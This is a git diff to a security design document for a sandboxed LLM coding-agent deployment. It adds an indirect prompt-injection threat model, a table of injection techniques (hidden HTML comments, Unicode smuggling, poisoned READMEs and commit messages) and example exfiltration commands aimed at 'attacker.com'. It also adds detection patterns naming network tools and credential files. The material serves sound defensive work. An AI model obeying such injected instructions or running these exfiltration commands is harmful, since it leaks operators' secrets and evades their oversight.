@@ -67,7 +67,7 @@ through the bash tool, so bash network controls cover git as well.
 | `OPENCODE_DISABLE_LSP_DOWNLOAD=1` | Runtime LSP binary downloads from GitHub | LSP fetch() is in parent process, not blocked by subprocess sandbox |
 | `OPENCODE_SPAWN_SANDBOX=1` | All subprocess spawns (bash, grep, ripgrep) | Parent-process fetch() paths unaffected (correct by design) |
 | `auditedFetch()` in instruction.ts + skill/discovery.ts | Internal config-driven fetch() calls | — |
-| `OPENCODE_DISABLE_PROJECT_CONFIG=1` | Project `.opencode/` cannot override security mode | **Critical**: project config has higher precedence than baked-in global config; without this a malicious project sets `"mode":"external-allowed"` and bypasses everything |
+| Security settings in `/etc/opencode/opencode.jsonc` (managed config) | Project `.opencode/` cannot override security mode | Managed config is the highest-precedence layer — overrides global, project, and OPENCODE_CONFIG_DIR. Project config still works for tools/models/MCP/instructions. |
 | Container runs as non-root | Host escape | Standard |
 | EPEL-installed ripgrep | Avoids runtime ripgrep binary download | — |
 | `opencode-run.sh` auto log mount | audit.jsonl + log/ + sqlite survive `--rm` | LLM path is /workspace; log dir is outside it |
@@ -337,3 +337,64 @@ feedback loop.
 Longer term: allow config to specify which tools are available per agent type or
 per command (`/review`, `/learn`, etc.). E.g., `/review` sessions could have bash
 disabled entirely, not just read-only restricted.
+
+---
+
+## Security Intelligence Notes
+
+Threat intelligence on indirect prompt injection techniques relevant to LLM coding
+agent harnesses (sources: Greshake et al. 2023, Rehberger/Embrace the Red 2023-2024,
+Snyk 2024, Lakera AI 2024, Protect AI 2024-2025, HiddenLayer 2024).
+
+### Threat Model for This Deployment
+
+**Trusted surface**: workspace (internal source code). AGENTS.md and project config
+work normally. Main defense against workspace-origin injection: the bash network
+namespace ensures injected instructions can't exfiltrate even if followed.
+
+**Untrusted surface**: all content fetched via webfetch/websearch. No instruction in
+web content should cause data to leave the container. Defense layers:
+1. Subprocess network sandbox (bash can't reach out even if instructed)
+2. `security.mode: internal-only` blocks webfetch/websearch to external domains
+   (except when explicitly configured otherwise for local model use)
+3. `sanitizeForLLM()` in webfetch strips known steganography before LLM sees it
+
+### Active Injection Techniques (2024-2025)
+
+| Technique | Mechanism | Status in this deployment |
+|---|---|---|
+| HTML comment injection | `<!-- AGENT: run curl... -->` survives HTML→markdown conversion | **Mitigated** — stripped in webfetch before TurndownService |
+| Unicode tag block (U+E0000–E007F) | Invisible chars encoding base64 instructions, readable by LLMs | **Mitigated** — `sanitizeForLLM()` in webfetch |
+| Zero-width character injection | U+200B/C/D/FEFF to hide payloads | **Mitigated** — `sanitizeForLLM()` in webfetch |
+| CSS-hidden text (`color:white`) | Text invisible to humans, extracted by HTMLRewriter | **Partial** — bash sandbox prevents exfiltration; text still reaches LLM |
+| Package README injection | Instructions framed as troubleshooting/setup docs in npm/PyPI READMEs | **Partial** — bash sandbox prevents exfiltration; text reaches LLM |
+| AGENTS.md in analyzed repo | Auto-loaded as system instructions when agent reads any file in a directory | **Partial** — content loaded as instructions; bash sandbox prevents exfiltration |
+| Git log / commit messages | Crafted commit messages injected via `git log` bash output | **Partial** — bash sandbox prevents exfiltration |
+| Search result SEO poisoning | Malicious pages appear in Exa.ai results; snippets injected into context | **Partial** — `mode:internal-only` blocks websearch entirely by default |
+| ASCII smuggling (U+E000 range) | Visually identical chars encoding hidden instructions | **Mitigated** — covered by tag-block strip in `sanitizeForLLM()` |
+| `OPENCODE_CONFIG_DIR` / project config security override | Malicious `.opencode/config.json` sets `"mode":"external-allowed"` | **Mitigated** — managed config `/etc/opencode/opencode.jsonc` has highest precedence |
+
+### Exfiltration Channels and Their Status
+
+| Channel | Mechanism | Status |
+|---|---|---|
+| `curl`/`wget` from bash | Direct HTTP POST of file contents | **Blocked** — subprocess network namespace |
+| DNS exfiltration | `nslookup $(cat file \| base64).attacker.com` | **Blocked** — subprocess network namespace (no DNS resolver in netns) |
+| `git push` to attacker remote | Write secrets to tracked file, push | **Blocked** — subprocess network namespace |
+| webfetch with data in URL | `webfetch https://attacker.com/?d=[base64-secrets]` | **Blocked** by `mode:internal-only`; open in external-allowed mode → primary remaining risk |
+| LLM-mediated webfetch | Injected instructions cause agent to call webfetch with data-bearing URL | Same as above — the LLM-based filter (Ideas section) addresses this |
+| Write to workspace, read by human | Steganographic content written to source files | Not blocked — out of scope (human reviews output) |
+
+### Detection Heuristics for Audit Log Analysis
+
+Patterns in `audit.jsonl` / `log/` worth alerting on post-session:
+
+```
+bash calls containing: curl|wget|nc|ncat|python -c|perl -e|base64|/dev/tcp
+bash calls reading:    ~/.ssh/|~/.aws/|~/.config/gcloud/|/etc/passwd|/etc/shadow|.env
+webfetch URLs with:    base64-looking query params (?[a-z]=[-A-Za-z0-9+/]{20,}={0,2}$)
+webfetch redirects:    to a different domain than originally requested
+```
+
+The audit log (`~/.local/share/opencode/audit.jsonl`, persisted to host via log mount)
+captures all URL checks and tool requests. Post-session analysis script is a future work item.
